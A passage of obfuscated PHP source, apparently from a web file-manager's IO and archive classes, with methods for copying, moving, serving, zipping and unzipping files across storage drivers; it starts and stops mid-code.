$åÄİÅ->getPathOuter($¨’¾‚); } if (method_exists($åÄİÅ, $•ŠüÑı¯)) { return $åÄİÅ->{$•ŠüÑı¯}($¨’¾‚, $Áöù••“, $¹ªáî¢’, $óÖøØÂ); } } if ($ò—Å¤ê¦ && $•ŠüÑı¯ == $·»›º¿[577] && $åÄİÅ->getType() == $·»›º¿[106]) { $ï£ïñš = $åÄİÅ->movePath($¨’¾‚, $Áöù••“, $óÖøØÂ); if ($ï£ïñš) { return $ï£ïñš; } } $ Û¿›ó = $ÕÅ‹°Ëò->isFile($¨’¾‚); if (!$ Û¿›ó && $åÄİÅ->getType() == $·»›º¿[783] && $ÕÅ‹°Ëò->getType() == $·»›º¿[106]) { $ï£ïñš = $åÄİÅ->copyFolderFromIO($ÕÅ‹°Ëò, $¨’¾‚, $Áöù••“, $¹ªáî¢’, $ë¥¾ä¾­, $óÖøØÂ); } else { $ï£ïñš = self::copyPath($ÕÅ‹°Ëò, $¨’¾‚, $åÄİÅ, $Áöù••“, $¹ªáî¢’, $ë¥¾ä¾­, $ Û¿›ó, $óÖøØÂ); } if ($ï£ïñš && $ë¥¾ä¾­) { $ÕÅ‹°Ëò->remove($¨’¾‚); } if ($ç¦¡÷ó¨) { $ï£ïñš = $ç¦¡÷ó¨->getPathOuter($ï£ïñš); } return $ï£ïñš; } private static function check($ıŠ„İØÔ, $àŒ¢â‚, $ŒæÉ—Áï, &$ºÎã …Á) { $™Ç³å¨Û =& $_SERVER[¹ş¤¶ĞÖ]; if (self::driverIsSame($ıŠ„İØÔ, $ŒæÉ—Áï) && $ıŠ„İØÔ->isFolder($àŒ¢â‚) && $ıŠ„İØÔ->isParentOf($àŒ¢â‚, $ºÎã …Á)) { show_json(LNG($™Ç³å¨Û[1187]), !1); } if (!$ıŠ„İØÔ->exist($àŒ¢â‚)) { show_json(LNG($™Ç³å¨Û[105]), !1); } } private static function copyPath($š€ìşÓ, $â®±¤æç, $Ù’ê¨¹, $ˆöóÜ÷´, $¢—¿Ç×ˆ, $ÎÙ¹¹Äö, $óãêğË², $Í™ùıé¾ = false, $ì÷ÇäæÈ = true) { $ÔÒüã½§ =& $_SERVER[¹ş¤¶ĞÖ]; $¸”ìê¬Å = empty($Í™ùıé¾) && $Í™ùıé¾ !== $ÔÒüã½§[198] ? $š€ìşÓ->pathThis($â®±¤æç) : $Í™ùıé¾; if ($¢—¿Ç×ˆ) { $‹Ï•ˆ = $Ù’ê¨¹->fileNameExist($ˆöóÜ÷´, $¸”ìê¬Å); $óÏô­® = $¸”ìê¬Å; $¸”ìê¬Å = $Ù’ê¨¹->fileNameAuto($ˆöóÜ÷´, $¸”ìê¬Å, $¢—¿Ç×ˆ, !$óãêğË²); if (!$‹Ï•ˆ || $óÏô­® != $¸”ìê¬Å) { $¢—¿Ç×ˆ = !1; } if ($ì÷ÇäæÈ && !$¢—¿Ç×ˆ) { $Ù’ê¨¹->_data[$ÔÒüã½§[1188]] = !0; } } if ($óãêğË²) { return self::copyFile($š€ìşÓ, $â®±¤æç, $Ù’ê¨¹, $ˆöóÜ÷´, $¸”ìê¬Å, $ÎÙ¹¹Äö); } if ($¢—¿Ç×ˆ == REPEAT_RENAME_FOLDER) { $¢—¿Ç×ˆ = !1; } $¾‰©õ›½ = rtrim($ˆöóÜ÷´, $ÔÒüã½§[8]) . $ÔÒüã½§[8] . $¸”ìê¬Å; $œ¶¢óĞ´ = $Ù’ê¨¹->mkdir($Ù’ê¨¹->getPath($¾‰©õ›½), $¢—¿Ç×ˆ); $ˆöóÜ÷´ = $Ù’ê¨¹->getPathInner($œ¶¢óĞ´); $áïĞÉ¦¢ = $š€ìşÓ->listPath($â®±¤æç, !0); $áïĞÉ¦¢ = is_array($áïĞÉ¦¢) ? $áïĞÉ¦¢ : array($ÔÒüã½§[83] => array(), $ÔÒüã½§[82] => array()); $¹ÑøÔ°³ = array_merge($áïĞÉ¦¢[$ÔÒüã½§[83]], $áïĞÉ¦¢[$ÔÒüã½§[82]]); foreach ($¹ÑøÔ°³ as $«ëÀÁ´¶) { $êôßË«  = $«ëÀÁ´¶[$ÔÒüã½§[33]] == $ÔÒüã½§[200]; $â®±¤æç = $š€ìşÓ->getPathInner($«ëÀÁ´¶[$ÔÒüã½§[84]]); $×åò¡›„ = self::copyPath($š€ìşÓ, $â®±¤æç, $Ù’ê¨¹, $ˆöóÜ÷´, $¢—¿Ç×ˆ, $ÎÙ¹¹Äö, $êôßË« , !1, !1); if (!$×åò¡›„) { IO::errorTips($ÔÒüã½§[1189] . $â®±¤æç . $ÔÒüã½§[70] . $ˆöóÜ÷´); } } self::copyMoveKeepInfo($š€ìşÓ, $â®±¤æç, $œ¶¢óĞ´); return $œ¶¢óĞ´; } private static function copyFile($úÉ«³¶, $ƒî“äç, $äÉƒÈú©, $«“‚©üş, $İ¼×½×, $šòäê¸Â) { $ö›»ÚÍ =& $_SERVER[¹ş¤¶ĞÖ]; $«“‚©üş = $äÉƒÈú©->getPath(rtrim($«“‚©üş, $ö›»ÚÍ[8]) . $ö›»ÚÍ[8] . $İ¼×½×); $¶Û…İ€à = $ö›»ÚÍ[1190] . time() . rand_string(5); Hook::trigger($ö›»ÚÍ[1191], $úÉ«³¶, $ƒî“äç, $äÉƒÈú©, $«“‚©üş, $İ¼×½×, $¶Û…İ€à); if (self::driverIsSame($úÉ«³¶, $äÉƒÈú©)) { if ($šòäê¸Â) { $ÄÉÎáè = $äÉƒÈú©->moveFile($ƒî“äç, $«“‚©üş); } else { $ÄÉÎáè = $äÉƒÈú©->copyFile($ƒî“äç, $«“‚©üş); } Hook::trigger($ö›»ÚÍ[1192], $úÉ«³¶, $ƒî“äç, $äÉƒÈú©, $«“‚©üş, $İ¼×½×, $ÄÉÎáè); self::copyMoveKeepInfo($úÉ«³¶, $ƒî“äç, $ÄÉÎáè); return $ÄÉÎáè; } $ÙÏİ§¯¡ = TEMP_FILES; if ($GLOBALS[$ö›»ÚÍ[6]][$ö›»ÚÍ[89]][$ö›»ÚÍ[822]]) { $ÙÏİ§¯¡ = $GLOBALS[$ö›»ÚÍ[6]][$ö›»ÚÍ[89]][$ö›»ÚÍ[822]]; } $åß„˜ã© = $ÙÏİ§¯¡; mk_dir($åß„˜ã©); $Ï¥“ùµô = $åß„˜ã© . $¶Û…İ€à; $Â‘»ÀŸÛ = $Ï¥“ùµô; $Ï¥“ùµô = $úÉ«³¶->download($ƒî“äç, $Ï¥“ùµô); $Ï¥“ùµô = $úÉ«³¶->iconvApp($Ï¥“ùµô); if (substr($Ï¥“ùµô, strlen($ÙÏİ§¯¡)) == $ÙÏİ§¯¡) { $šòäê¸Â = !0; } $ÄÉÎáè = $äÉƒÈú©->upload($«“‚©üş, $Ï¥“ùµô, $šòäê¸Â); self::remove($Â‘»ÀŸÛ); Hook::trigger($ö›»ÚÍ[1192], $úÉ«³¶, $ƒî“äç, $äÉƒÈú©, $«“‚©üş, $İ¼×½×, $ÄÉÎáè); self::copyMoveKeepInfo($úÉ«³¶, $ƒî“äç, $ÄÉÎáè); return $ÄÉÎáè; } private static function copyMoveKeepInfo($Æ¹úäµÎ, $İÀœÉùˆ, $ªÊâ—É) { if (!$ªÊâ—É) { return; } $³ö˜†’ò = $Æ¹úäµÎ->info($İÀœÉùˆ); if (!is_array($³ö˜†’ò)) { return; } IO::setModifyTime($ªÊâ—É, $³ö˜†’ò[$_SERVER[¹ş¤¶ĞÖ][85]]); } public static function pathFather($ƒÄ«¦º¬) { $‚üûê¹ß = IO::init($ƒÄ«¦º¬); $ï·ùµğ¦ = $‚üûê¹ß->pathFather($‚üûê¹ß->path); return $‚üûê¹ß->getPathOuter($ï·ùµğ¦); } public static function fileOut($×ğ¹ş¸·, $Çüûë©¡ = false, $¹ç¯ÜƒÕ = false, $ ‹ä ±í = '') { $¼’¼¦¥´ = self::driverMake($×ğ¹ş¸·); if ($¼’¼¦¥´->isFileOutServer()) { return $¼’¼¦¥´->fileOutServer($×ğ¹ş¸·, $Çüûë©¡, $¹ç¯ÜƒÕ, $ ‹ä ±í); } return $¼’¼¦¥´->fileOut($×ğ¹ş¸·, $Çüûë©¡, $¹ç¯ÜƒÕ, $ ‹ä ±í); } public static function fileOutImage($£ëÔ¤µò, $»¤ÃŞ¦° = 250) { $Øç”ñÓ¿ = array(250, 600, 1200, 2000, 3000, 5000); for ($²³ÙÈ÷ = 0; $²³ÙÈ÷ < count($Øç”ñÓ¿); $²³ÙÈ÷++) { if ($²³ÙÈ÷ == 0 && $»¤ÃŞ¦° <= $Øç”ñÓ¿[$²³ÙÈ÷]) { $»¤ÃŞ¦° = $Øç”ñÓ¿[$²³ÙÈ÷]; break; } else { if ($»¤ÃŞ¦° > $Øç”ñÓ¿[$²³ÙÈ÷ - 1] && $»¤ÃŞ¦° <= $Øç”ñÓ¿[$²³ÙÈ÷]) { $»¤ÃŞ¦° = $Øç”ñÓ¿[$²³ÙÈ÷]; break; } else { if ($²³ÙÈ÷ == count($Øç”ñÓ¿) - 1 && $»¤ÃŞ¦° > $Øç”ñÓ¿[$²³ÙÈ÷]) { $»¤ÃŞ¦° = $Øç”ñÓ¿[$²³ÙÈ÷]; break; } } } } $é—ğÃş¬ = self::driverMake($£ëÔ¤µò); if ($é—ğÃş¬->isFileOutServer()) { return $é—ğÃş¬->fileOutImageServer($£ëÔ¤µò, $»¤ÃŞ¦°); } return $é—ğÃş¬->fileOutImage($£ëÔ¤µò, $»¤ÃŞ¦°); } private static function driverIsSame($ÆÉá§¹¾, $­Ş¾§³æ) { $ª­·Ï¾• =& $_SERVER[¹ş¤¶ĞÖ]; $©³Â°Ü = $ÆÉá§¹¾->getType(); $…¹‘Û®Õ = $­Ş¾§³æ->getType(); if ($©³Â°Ü != $…¹‘Û®Õ) { return !1; } if ($©³Â°Ü == $ª­·Ï¾•[783]) { return !0; } if ($©³Â°Ü == $ª­·Ï¾•[106]) { return !0; } if ($ÆÉá§¹¾->pathDriver == $­Ş¾§³æ->pathDriver) { return !0; } return !1; } public static function copyUpdate($¢½³«¯Š, $úŞ”Áº„) { $ªïú’— =& $_SERVER[¹ş¤¶ĞÖ]; if (!IO::exist($¢½³«¯Š)) { return !1; } if (!IO::exist($úŞ”Áº„)) { IO::mkdir($úŞ”Áº„); } $ğĞÄƒù‡ = array_to_keyvalue(self::listAllSimple($¢½³«¯Š), $ªïú’—[84]); $ÊŠÓıµŸ = array_to_keyvalue(self::listAllSimple($úŞ”Áº„), $ªïú’—[84]); $õéÀ½¡ = array(); $¸¼ªÌ¾ = array(); foreach ($ğĞÄƒù‡ as $Úáß¬¢Û => $ĞÒ³åÍá) { if (isset($ÊŠÓıµŸ[$Úáß¬¢Û])) { if ($ĞÒ³åÍá[$ªïú’—[75]] == 1) { continue; } if ($ÊŠÓıµŸ[$Úáß¬¢Û][$ªïú’—[76]] == $ĞÒ³åÍá[$ªïú’—[76]]) { continue; } } if ($ĞÒ³åÍá[$ªïú’—[75]] == 1) { $¸¼ªÌ¾[] = $úŞ”Áº„ . $ªïú’—[8] . trim($Úáß¬¢Û, $ªïú’—[8]); continue; } $Î©§íóÆ = strstr(trim($Úáß¬¢Û, $ªïú’—[8]), $ªïú’—[8]) ? get_path_father($Úáß¬¢Û) : $ªïú’—[12]; $õéÀ½¡[] = array($ªïú’—[1193] => $ĞÒ³åÍá[$ªïú’—[86]], $ªïú’—[1194] => rtrim($úŞ”Áº„, $ªïú’—[8]) . $ªïú’—[8] . $Î©§íóÆ, $ªïú’—[1195] => $ĞÒ³åÍá); } $í½şöü± = array($ªïú’—[200] => $õéÀ½¡, $ªïú’—[75] => $¸¼ªÌ¾); Hook::trigger($ªïú’—[1196], $¢½³«¯Š, $úŞ”Áº„, $í½şöü±); foreach ($¸¼ªÌ¾ as $ĞÒ³åÍá) { IO::mkdir($ĞÒ³åÍá); } foreach ($õéÀ½¡ as $ĞÒ³åÍá) { IO::copy($ĞÒ³åÍá[$ªïú’—[1193]], $ĞÒ³åÍá[$ªïú’—[1194]], REPEAT_REPLACE); } } public static function fileSubstr($Ğº“ûå‘, $ñˆ£™¶ò, $şİà¢Ì­ = false) { $ùÇÊı‹ =& $_SERVER[¹ş¤¶ĞÖ]; $ıé¡œ× = self::driverMake($Ğº“ûå‘); $ı¶ÏŒõü = $ıé¡œ×->size($Ğº“ûå‘); $”­Çè±â = $ñˆ£™¶ò; $ÃëÇŠ¢Ç = $şİà¢Ì­; if ($ñˆ£™¶ò < 0) { $ñˆ£™¶ò = $ı¶ÏŒõü + $ñˆ£™¶ò; } if ($şİà¢Ì­ === !1) { $şİà¢Ì­ = $ı¶ÏŒõü - $ñˆ£™¶ò; } if ($ñˆ£™¶ò + $şİà¢Ì­ > $ı¶ÏŒõü) { $şİà¢Ì­ = $ı¶ÏŒõü - $ñˆ£™¶ò; } if (!$ı¶ÏŒõü && $ıé¡œ×->getType() == $ùÇÊı‹[106] && !$ıé¡œ×->exist($Ğº“ûå‘)) { $Àè ”Ÿ = get_path_this($Ğº“ûå‘); $ŸğùĞô = parse_url_query($Àè ”Ÿ); if (is_array($ŸğùĞô) && isset($ŸğùĞô[$ùÇÊı‹[32]])) { $Àè ”Ÿ = urldecode($ŸğùĞô[$ùÇÊı‹[32]]); } throw new Exception($ùÇÊı‹[1197] . LNG($ùÇÊı‹[1198]) . $ùÇÊı‹[999] . clear_html($Àè ”Ÿ) . $ùÇÊı‹[12]); } if ($şİà¢Ì­ <= 0) { return $ùÇÊı‹[12]; } if ($ñˆ£™¶ò < 0 || $ñˆ£™¶ò >= $ı¶ÏŒõü || $şİà¢Ì­ > 1024 * 1024 * 10) { throw new Exception("\146\x69\x6c\145\122\145\141\x64\40\145\x72\162\x6f\162\x21\x20\163\164\x61\x72\164\x3d{$ñˆ£™¶ò}\73\154\x65\x6e\x67\x74\x68\75{$şİà¢Ì­}\73\x20\163\x69\172\x65\75{$ı¶ÏŒõü}\x3b"); } $îÂõŒš = $ıé¡œ×->fileSubstr($Ğº“ûå‘, $ñˆ£™¶ò, $şİà¢Ì­); if (!$îÂõŒš && $şİà¢Ì­ && isset($GLOBALS[$ùÇÊı‹[1199]])) { throw new Exception($GLOBALS[$ùÇÊı‹[1199]][$ùÇÊı‹[1200]]); } return $îÂõŒš; } private static function driverMake(&$øõ¤×°Ø) { $™Õ ¤Ú¬ =& $_SERVER[¹ş¤¶ĞÖ]; $à½¸ï– = KodIO::parse($øõ¤×°Ø); if (!self::$driverListSystem) { $Çïõ«¥Í = Model($™Õ ¤Ú¬[793])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($Çïõ«¥Í, $™Õ ¤Ú¬[428]); } if ($à½¸ï–[$™Õ ¤Ú¬[33]] == KodIO::KOD_IO && !self::$driverListSystem[$à½¸ï–[$™Õ ¤Ú¬[428]]]) { return !1; } $øõ¤×°Ø = $à½¸ï–[$™Õ ¤Ú¬[1201]]; $œèí¤Ïú = self::driverGet($à½¸ï–, $øõ¤×°Ø); return $œèí¤Ïú; } private static function driverGet($¤¿ş™™•, &$ı‘Æ­ïá) { $Ôİ¥Šô =& $_SERVER[¹ş¤¶ĞÖ]; $Ğ¦Òú…§ = $¤¿ş™™•[$Ôİ¥Šô[1202]]; $³º““°Ö = $¤¿ş™™•[$Ôİ¥Šô[428]]; switch ($¤¿ş™™•[$Ôİ¥Šô[33]]) { case KodIO::KOD_IO: $øØàŸœ = self::$driverListSystem[$³º““°Ö]; break; case KodIO::KOD_SOURCE: $ı‘Æ­ïá = $³º““°Ö . $ı‘Æ­ïá; $øØàŸœ = array($Ôİ¥Šô[1203] => $Ôİ¥Šô[1204], $Ôİ¥Šô[6] => $¤¿ş™™•); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $£ÓÔœô = $GLOBALS[$Ôİ¥Šô[1205]]; self::$driverListUser = array_to_keyvalue($£ÓÔœô, $Ôİ¥Šô[428]); } $øØàŸœ = self::$driverListUser[$³º““°Ö]; break; case KodIO::KOD_SHARE_LINK: $øØàŸœ = array($Ôİ¥Šô[1203] => $Ôİ¥Šô[1206], $Ôİ¥Šô[6] => $¤¿ş™™•); $¯Ò¥Ğ¾ñ = Action($Ôİ¥Šô[1207])->sharePathInfo($¤¿ş™™•[$Ôİ¥Šô[84]]); $ı‘Æ­ïá = $¯Ò¥Ğ¾ñ[$Ôİ¥Šô[431]]; if (!$¯Ò¥Ğ¾ñ[$Ôİ¥Šô[431]]) { $Í‰Ÿ’À£ = Model($Ôİ¥Šô[621])->getInfo($¯Ò¥Ğ¾ñ[$Ôİ¥Šô[622]]); $ı‘Æ­ïá = KodIO::clear($Í‰Ÿ’À£[$Ôİ¥Šô[1208]] . $¤¿ş™™•[$Ôİ¥Šô[1201]]); $¤¿ş™™•[$Ôİ¥Šô[515]] = $Í‰Ÿ’À£; $¤¿ş™™•[$Ôİ¥Šô[1184]] = $ı‘Æ­ïá; $øØàŸœ = array($Ôİ¥Šô[1203] => $Ôİ¥Šô[1209], $Ôİ¥Šô[6] => $¤¿ş™™•); } break; case KodIO::KOD_SHARE_ITEM: $øØàŸœ = array($Ôİ¥Šô[1203] => $Ôİ¥Šô[1210], $Ôİ¥Šô[6] => $¤¿ş™™•); $Í‰Ÿ’À£ = Model($Ôİ¥Šô[621])->getInfo($¤¿ş™™•[$Ôİ¥Šô[428]]); if ($Í‰Ÿ’À£[$Ôİ¥Šô[431]] == $Ôİ¥Šô[198]) { $ı‘Æ­ïá = KodIO::clear($Í‰Ÿ’À£[$Ôİ¥Šô[1208]] . $¤¿ş™™•[$Ôİ¥Šô[1201]]); $¤¿ş™™•[$Ôİ¥Šô[515]] = $Í‰Ÿ’À£; $¤¿ş™™•[$Ôİ¥Šô[1184]] = $ı‘Æ­ïá; $øØàŸœ = array($Ôİ¥Šô[1203] => $Ôİ¥Šô[1211], $Ôİ¥Šô[6] => $¤¿ş™™•); } else { if (!$ı‘Æ­ïá) { $ı‘Æ­ïá = $Í‰Ÿ’À£[$Ôİ¥Šô[431]]; } } break; default: $ı‘Æ­ïá = $¤¿ş™™•[$Ôİ¥Šô[84]]; $øØàŸœ = array($Ôİ¥Šô[1203] => $Ôİ¥Šô[1212]); break; } $æÏ÷Ä€ë = $¤¿ş™™•[$Ôİ¥Šô[84]]; if (!isset(self::$driverCache[$æÏ÷Ä€ë])) { $İùÉ€½’ = strtolower($øØàŸœ[$Ôİ¥Šô[95]]); $Ÿ×ùèÉà = $GLOBALS[$Ôİ¥Šô[6]][$Ôİ¥Šô[89]][$Ôİ¥Šô[852]]; $©à¿µ±Ê = $Ôİ¥Šô[74] . (isset($Ÿ×ùèÉà[$İùÉ€½’]) ? $Ÿ×ùèÉà[$İùÉ€½’] : ucfirst($İùÉ€½’)); if (!class_exists($©à¿µ±Ê)) { show_json("{$©à¿µ±Ê}\x20\156\157\164\x20\x65\x78\x69\x73\164\163\41", !1); } $Ìªª´ª = isset($øØàŸœ[$Ôİ¥Šô[6]]) ? $øØàŸœ[$Ôİ¥Šô[6]] : !1; self::$driverCache[$æÏ÷Ä€ë] = new $©à¿µ±Ê($Ìªª´ª); } $•³¬»È = self::$driverCache[$æÏ÷Ä€ë]; $•³¬»È->pathDriver = $Ğ¦Òú…§; $•³¬»È->pathBase = $Ôİ¥Šô[12]; if (isset($øØàŸœ[$Ôİ¥Šô[6]][$Ôİ¥Šô[1213]])) { $•³¬»È->pathBase = rtrim($øØàŸœ[$Ôİ¥Šô[6]][$Ôİ¥Šô[1213]], $Ôİ¥Šô[8]) . $Ôİ¥Šô[8]; $ı‘Æ­ïá = $•³¬»È->pathBase . ltrim($ı‘Æ­ïá, $Ôİ¥Šô[8]); } $ı‘Æ­ïá = $•³¬»È->getPath($ı‘Æ­ïá); if (isset($¤¿ş™™•[$Ôİ¥Šô[1184]])) { $ı‘Æ­ïá = $¤¿ş™™•[$Ôİ¥Šô[1184]]; } $•³¬»È->path = $ı‘Æ­ïá; return $•³¬»È; } public static function errorTips($ä—É›‰å = false) { $§±´¬Øø =& $_SERVER[¹ş¤¶ĞÖ]; static $îÖäÜüö = array(); $œ‡Ü¯ƒº = 1000; if ($ä—É›‰å === -1) { return $îÖäÜüö ? $îÖäÜüö[count($îÖäÜüö) - 1] : $§±´¬Øø[12]; } if ($ä—É›‰å === !1) { return implode($§±´¬Øø[231], $îÖäÜüö); } if (count($îÖäÜüö) >= $œ‡Ü¯ƒº) { $îÖäÜüö = array_slice($îÖäÜüö, $œ‡Ü¯ƒº * 0.5, $œ‡Ü¯ƒº); } $îÖäÜüö[] = $ä—É›‰å; write_log($§±´¬Øø[162] . ACTION . $§±´¬Øø[1214] . $ä—É›‰å, $§±´¬Øø[1215]); } public static function getLastError($·ÙŸ¥ˆ = '') { $‹ØõÀ´Ö = self::errorTips(-1); return $‹ØõÀ´Ö ? $‹ØõÀ´Ö : $·ÙŸ¥ˆ; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $ñ‹Ã¼‹°; if ($ñ‹Ã¼‹°) { return $ñ‹Ã¼‹°; } $‹Èñ÷˜° = IO::init($_SERVER[¹ş¤¶ĞÖ][8]); return $‹Èñ÷˜°; } private static function iconvSystem($ÃˆÒõ‘±) { return self::local()->iconvSystem($ÃˆÒõ‘±); } private static function iconvApp($¾Ì…ùÉ©) { return self::local()->iconvApp($¾Ì…ùÉ©); } public static function zipFolder($îãĞ”Îë, $²ŠÓ§»Â = "\x7a\x69\x70", $§³ÑÄãø = '', $éıÌ‚Î = REPEAT_RENAME) { $ŸÚ„¸‹Ú =& $_SERVER[¹ş¤¶ĞÖ]; $šî¤ø‰´ = IO::listPath($îãĞ”Îë); if (!$šî¤ø‰´) { return !1; } $šî¤ø‰´ = array_merge($šî¤ø‰´[$ŸÚ„¸‹Ú[82]], $šî¤ø‰´[$ŸÚ„¸‹Ú[83]]); return self::zip($šî¤ø‰´, $²ŠÓ§»Â, $§³ÑÄãø, $éıÌ‚Î); } public static function zip($±Ÿ¹õè, $»»Ãú‘¨ = "\x7a\x69\160", $ÑŸË€¿® = '', $æ‘È·´Å = REPEAT_RENAME) { $«êèÕ¢ =& $_SERVER[¹ş¤¶ĞÖ]; if (is_string($±Ÿ¹õè) && $±Ÿ¹õè) { $±Ÿ¹õè = array(array($«êèÕ¢[84] => $±Ÿ¹õè)); } $ûú ”ÜÉ = self::init($±Ÿ¹õè[0][$«êèÕ¢[84]]); $Çğé»ÅÎ = self::info($±Ÿ¹õè[0][$«êèÕ¢[84]]); $ª¡÷¾ÇŠ = $«êèÕ¢[12]; $âæŸš˜€ = $«êèÕ¢[12]; $ıÒéÊÒ¢ = $«êèÕ¢[12]; if ($ÑŸË€¿® && substr($ÑŸË€¿®, -1, 1) != $«êèÕ¢[8]) { $âæŸš˜€ = get_path_father($ÑŸË€¿®); $ıÒéÊÒ¢ = get_path_this($ÑŸË€¿®); } else { $âæŸš˜€ = self::pathFather($Çğé»ÅÎ[$«êèÕ¢[84]]); $ıÒéÊÒ¢ = $Çğé»ÅÎ[$«êèÕ¢[32]] . $«êèÕ¢[10] . $»»Ãú‘¨; if (count($±Ÿ¹õè) > 1) { $¢¿Ğ´Ùâ = IO::info($âæŸš˜€); $ıÒéÊÒ¢ = $¢¿Ğ´Ùâ[$«êèÕ¢[32]] . $«êèÕ¢[10] . $»»Ãú‘¨; } if ($ÑŸË€¿®) { $âæŸš˜€ = $ÑŸË€¿®; } } if ($ûú ”ÜÉ->getType() == $«êèÕ¢[106]) { $¦¶ñ»ßí = self::init($âæŸš˜€); $¨×Ï—çÈ = $¦¶ñ»ßí->getType() == $«êèÕ¢[106] ? $âæŸš˜€ : get_path_father($ûú ”ÜÉ->path); $¨×Ï—çÈ = rtrim($¨×Ï—çÈ, $«êèÕ¢[8]) . $«êèÕ¢[8]; mk_dir($¨×Ï—çÈ); } else { $ª¡÷¾ÇŠ = TEMP_FILES . $«êèÕ¢[1216] . time() . rand_string(8) . $«êèÕ¢[8]; mk_dir($ª¡÷¾ÇŠ); file_put_contents($ª¡÷¾ÇŠ . $«êèÕ¢[1217], $«êèÕ¢[12]); $¨×Ï—çÈ = $ª¡÷¾ÇŠ; } $ú¿Ãıåµ = IO::info($¨×Ï—çÈ); if (!$ú¿Ãıåµ || !$ú¿Ãıåµ[$«êèÕ¢[203]]) { show_json(LNG($«êèÕ¢[1218]), !1); } $ª„ìÖ•Ò = self::zipFileList($±Ÿ¹õè, $ª¡÷¾ÇŠ); foreach ($ª„ìÖ•Ò as $Ò±İÌù¤ => $±èÅ—±¿) { $ª„ìÖ•Ò[$Ò±İÌù¤] = self::iconvSystem($±èÅ—±¿); } $ü•óöÖ„ = get_filename_auto($¨×Ï—çÈ . $ıÒéÊÒ¢, $«êèÕ¢[12], $æ‘È·´Å); KodArchive::create(self::iconvSystem($ü•óöÖ„), $ª„ìÖ•Ò); if (!IO::exist($ü•óöÖ„)) { if ($ª¡÷¾ÇŠ) { del_dir($ª¡÷¾ÇŠ); } show_json(LNG($«êèÕ¢[1219]), !1); } if (!$ª¡÷¾ÇŠ) { return $ü•óöÖ„; } $ôÕ÷°³Ã = self::move($ü•óöÖ„, $âæŸš˜€, $æ‘È·´Å); if ($ª¡÷¾ÇŠ) { del_dir($ª¡÷¾ÇŠ); } if (!$ü•óöÖ„) { show_json(LNG($«êèÕ¢[1219]), !1); } return $ôÕ÷°³Ã; } public static function unzip($±¤¶ˆ‚¯, $£Ôü„ıê, $«€§ò´ = "\x2d\x31", $Œç€è¯ = "\162\145\x70\x6c\141\143\145") { $šÊî½Ì =& $_SERVER[¹ş¤¶ĞÖ]; $†ôå  = parent::info($±¤¶ˆ‚¯); if (!$†ôå ) { show_json(LNG($šÊî½Ì[1220]), !1); } $°ˆ¨Ä¡Ÿ = IO::infoFull($£Ôü„ıê); if (!$°ˆ¨Ä¡Ÿ) { $£Ôü„ıê = IO::mkdir($£Ôü„ıê); } if (isset($°ˆ¨Ä¡Ÿ[$šÊî½Ì[431]]) && trim($°ˆ¨Ä¡Ÿ[$šÊî½Ì[84]], $šÊî½Ì[8]) != trim($£Ôü„ıê, $šÊî½Ì[8])) { $¦å¾š¬´ = KodIO::make($°ˆ¨Ä¡Ÿ[$šÊî½Ì[461]]); $™Š½Œ‹· = IO::fileNameAuto($¦å¾š¬´, $°ˆ¨Ä¡Ÿ[$šÊî½Ì[32]], REPEAT_RENAME_FOLDER, !0); $£Ôü„ıê = IO::mkdir($¦å¾š¬´ . $™Š½Œ‹·); } $«€§ò´ = $«€§ò´ && $«€§ò´ != $šÊî½Ì[1221] ? @json_decode($«€§ò´, !0) : -1; $·½ÃÓÑÌ = self::unzipPart($±¤¶ˆ‚¯, $«€§ò´); if (!$·½ÃÓÑÌ || !IO::exist($·½ÃÓÑÌ[$šÊî½Ì[200]])) { show_json(LNG($šÊî½Ì[105]), !1); } $¼‘–‰Âñ = $·½ÃÓÑÌ[$šÊî½Ì[1222]][count($·½ÃÓÑÌ[$šÊî½Ì[1222]]) - 1]; if ($¼‘–‰Âñ[$šÊî½Ì[1223]] == -1 || substr($¼‘–‰Âñ[$šÊî½Ì[32]], -1, 1) == $šÊî½Ì[8]) { $à‚¿Ä‡ = $·½ÃÓÑÌ[$šÊî½Ì[1224]] . rand_string(10) . $šÊî½Ì[8]; mk_dir($à‚¿Ä‡); $É¿õøŞú = count($·½ÃÓÑÌ[$šÊî½Ì[1222]]) == 1 ? IO::ext($±¤¶ˆ‚¯) : get_path_ext($·½ÃÓÑÌ[$šÊî½Ì[200]]); $ó‚Ûğ°º = KodArchive::extract(self::iconvSystem($·½ÃÓÑÌ[$šÊî½Ì[200]]), $à‚¿Ä‡, $¼‘–‰Âñ[$šÊî½Ì[1223]], $™Š½Œ‹·, $É¿õøŞú); self::unzipErrorCheck($ó‚Ûğ°º, array($šÊî½Ì[1225], $±¤¶ˆ‚¯, $É¿õøŞú, $£Ôü„ıê, $·½ÃÓÑÌ)); Hook::trigger($šÊî½Ì[1226], $à‚¿Ä‡); recursion_dir($à‚¿Ä‡, $àËÔÀ§±, $Ä¡ñøØÏ, 0); $ÎÕĞ„” = array_merge($àËÔÀ§±, $Ä¡ñøØÏ); $Ğ½®¡¯ = array(); foreach ($ÎÕĞ„” as $¿Úö¯İ¾) { $§¶ĞÒÆ = IO::move(self::iconvApp($¿Úö¯İ¾), $£Ôü„ıê, $Œç€è¯); if ($§¶ĞÒÆ) { $Ğ½®¡¯[] = $§¶ĞÒÆ; } } del_dir($à‚¿Ä‡); } else { $§¶ĞÒÆ = IO::move($·½ÃÓÑÌ[$šÊî½Ì[200]], $£Ôü„ıê, $Œç€è¯, get_path_this($¼‘–‰Âñ[$šÊî½Ì[32]])); if ($§¶ĞÒÆ) { $Ğ½®¡¯[] = $§¶ĞÒÆ; } } return $Ğ½®¡¯ ? $Ğ½®¡¯ : !1; } public static function unzipList($æŞ ÚÇÊ) { $€¿øƒ‘² =& $_SERVER[¹ş¤¶ĞÖ]; $ö‹øÄë = isset($æŞ ÚÇÊ[$€¿øƒ‘²[1227]]) ? $æŞ ÚÇÊ[$€¿øƒ‘²[1227]] : !1; $åÌè‡ıÅ = isset($æŞ ÚÇÊ[$€¿øƒ‘²[1223]]) ? @json_decode($æŞ ÚÇÊ[$€¿øƒ‘²[1223]], !0) : -1; $ÂĞ¤øûŒ = self::unzipPart($æŞ ÚÇÊ[$€¿øƒ‘²[84]], $åÌè‡ıÅ); if (!$ÂĞ¤øûŒ || !IO::exist($ÂĞ¤øûŒ[$€¿øƒ‘²[200]])) { show_json(LNG($€¿øƒ‘²[105]), !1); } $òØ‡Ê¶« = $ÂĞ¤øûŒ[$€¿øƒ‘²[1222]][count($ÂĞ¤øûŒ[$€¿øƒ‘²[1222]]) - 1]; $ÊÛ§Š© = 